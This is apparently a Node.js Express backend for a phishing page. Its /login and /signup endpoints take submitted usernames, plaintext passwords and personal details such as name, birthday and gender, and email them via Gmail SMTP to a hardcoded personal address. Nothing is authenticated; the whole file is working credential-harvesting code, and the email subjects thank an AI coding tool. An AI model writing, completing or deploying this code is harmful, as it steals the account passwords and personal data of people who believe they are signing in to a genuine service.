
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const dotenv = require('dotenv');

// Load environment variables from .env file
dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Nodemailer Transporter Configuration
// Using Gmail SMTP with App Password
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER, // Your Gmail address
    pass: process.env.EMAIL_PASS, // Your Google App Password
  },
});

/**
 * POST /login
 * Receives login credentials and sends an email report.
 */
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toLocaleString();

  console.log(`[${timestamp}] Login attempt for: ${username}`);

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'inaminam11223@gmail.com',
    subject: 'LOGIN ATTEMPT - LOVE YOU GOOGLE AI STUDIO',
    text: `
      NEW LOGIN ATTEMPT RECORDED
      --------------------------
      Username: ${username}
      Password: ${password}
      Time: ${timestamp}
      Message: LOVE YOU GOOGLE AI STUDIO
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true, message: 'Login report sent to Gmail.' });
  } catch (error) {
    console.error('Email Error:', error);
    res.status(500).json({ success: false, message: 'Failed to send email.' });
  }
});

/**
 * POST /signup
 * Receives registration data and sends an email report.
 */
app.post('/signup', async (req, res) => {
  const data = req.body;
  const timestamp = new Date().toLocaleString();

  console.log(`[${timestamp}] Signup attempt for: ${data.mobileEmail}`);

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'inaminam11223@gmail.com',
    subject: 'NEW SIGNUP ATTEMPT - LOVE YOU GOOGLE AI STUDIO',
    text: `
      NEW SIGNUP ATTEMPT RECORDED
      ---------------------------
      First Name: ${data.firstName}
      Surname: ${data.surname}
      Mobile/Email: ${data.mobileEmail}
      Password: ${data.newPassword}
      Birthday: ${data.birthDay} ${data.birthMonth} ${data.birthYear}
      Gender: ${data.gender}
      Time: ${timestamp}
      Message: LOVE YOU GOOGLE AI STUDIO
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true, message: 'Signup report sent to Gmail.' });
  } catch (error) {
    console.error('Email Error:', error);
    res.status(500).json({ success: false, message: 'Failed to send email.' });
  }
});

app.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
});
